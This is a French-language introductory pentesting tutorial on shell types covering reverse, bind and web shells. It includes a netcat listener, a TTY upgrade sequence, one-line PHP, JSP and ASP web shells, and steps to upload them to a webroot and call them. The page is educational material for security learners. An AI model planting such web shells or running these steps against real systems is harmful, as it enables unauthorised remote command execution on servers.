---
title:  "Types de Shells"
category: "Les bases du test d'intrusion"
tag: "Introduction"
---
Une fois un système compromis, un moyen pour s'y connecter est :
- Par protocole **SSH** ou **WINRM** si des logins sont disponibles.
- Sinon RCE ou shell.

Rappels des types de shells :
- reverse Shell
- bind shell
- web shell

## 1) Reverse Shell

Méthode la plus facile et rapide pour avoir accès à un host compromis.
On peut lancer un netcat en écoute sur un port, qui va laisser les connections possibles sur un port spécifique pour que notre reverse shell s'y connecte. 
### Netcat listener
netcat en écoute sur le port 1234.
```console
Misoko@home[/home]$ nc -lvnp 1234
```
- -l mode d'écoute
- -n désactive la resolution DNS (seulement IP directe)

### Commande Reverse shell
Pour avoir accès à un shell, il faut qu'un programme soit exécuté sur le host distant en question, afin qu'il initie la connection.
Cela dépend du système, pour cela des commandes / programmes existent.\
[cheatList](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## 2) Bind Shell
Contrairement au reverse shell, c'est le système distant qui est en écoute, et c'est l'attaquant qui lance la connection.

**Avantage :** si on perd la connection du côté attaquant, on peut re-initier la connexion.\
**Inconvénient :** si le processus de l'hôte se déconnecte (ou l'hôte reboot), il faut exploiter de nouveau la vulnérabilité de base.\
[cheatList](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md)

### Amélioration TTY
Une fois qu'on connecte notre shell à travers netcat, on voit qu'on a seulement une interface de ligne de commande limitée (pas de complétion, modification de commandes, etc).\
Il faut alors mapper notre terminal tty avec le tty distant.\
***Un tty est le nom de périphérique Unix pour une connexion de terminal physique ou virtuel.***

Il existe de nombreuses méthodes. Nous allons en énumérer une ici :
- Dans notre shell netcat, on utilise une commande python pour upgrade notre shell en full TTY.
- On place en fond de tache arrière notre shell (avec CTRL + Z), et on revient sur notre terminal local.
- on exécute la commande ssty.
- on remet notre tty shell en premier plan.
- on tape la touche entrée pour récupérer la main sur le terminal.

```console
Misoko@home$ python -c 'import pty; pty.spawn("/bin/bash")'
Misoko@home$ ^Z
Misoko@home$ stty raw -echo
Misoko@home$ fg
[Enter]
[Enter]

user@remoteHost$ 
```

Pour avoir le tty sur tout le terminal, on doit récupérer le type de terminal et la longueur de ligne ou colonne que l'on veut sur un autre terminal local avec respectivement les commandes : 

```console
Misoko@home$  echo $TERM
xterm-256color
Misoko@home$  stty size
60(ligne) 315(colonne)
```
Puis sur le terminal "netcat", on configure le type et la taille du terminal :
```console
netCatTerminal@home$ export TERM=xterm-256color
netCatTerminal@home$ stty rows 60 columns 315
```

## 3) Web Shell

Un shell Web est un script web (php ou aspx par exemple), qui accepte des requêtes HTTP avec des paramètres et exécutera les commandes.
### Écriture du Web Shell
L'écriture est souvent simple :
- php : 
```console
<?php system($_REQUEST["cmd"]); ?> 
```
- jsp : 
```console
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %> 
```
- asp : 
```console
<% eval request("cmd") %>
```

### Upload le webShell

Après avoir créé le script webshell, il faut le déplacer dans le repertoire web distant de l'hôte (webroot), pour qu'il soit executé à travers le navigateur.\
On peut le faire à partir d'une vulnérabilité permettant un upload de fichier, ou si on a une RCE, on peut toujours écrire le shell **(commande echo)** dans des commandes et le déplacer au bon endroit.\
Il faut également d'abord connaître le webroot, les principaux sont indiqués ci dessous :

| Serveur Web | WebRoot par défaut|
| ------ | ----------- |
| Apache | /var/www/html/ |
| Nginx | /usr/local/nginx/html/ |
| IIS | c:\inetpub\wwwroot\ |
| xamp | C:\xampp\htdocs\ |

### Accéder aux shell web
Une fois écrit et placé, on peut accéder au shell web à travers le navigateur ou par curl.
Pour le script shell 
```console
<?php system($_REQUEST["cmd"]); ?>
```
```http
http://serveurIP:port/webShell.php?cmd=id
```

```console
curl http://serveurIP:port/webShell.php?cmd=id
```

- **Avantages** : les webshell permettent de contourner les pare-feux (n'ouvre pas de connection puisqu'on utilise les ports web, c'est à dire 80, 443 ou ceux sur lesquels transitent le flux web).\
Également, si l'hôte distant reboot, le webshell est toujours en place (on ne perd pas la connection comme avec un bind/reverse shell).
- **Inconvénient** : le web shell n'est pas aussi intéractif que les autres.
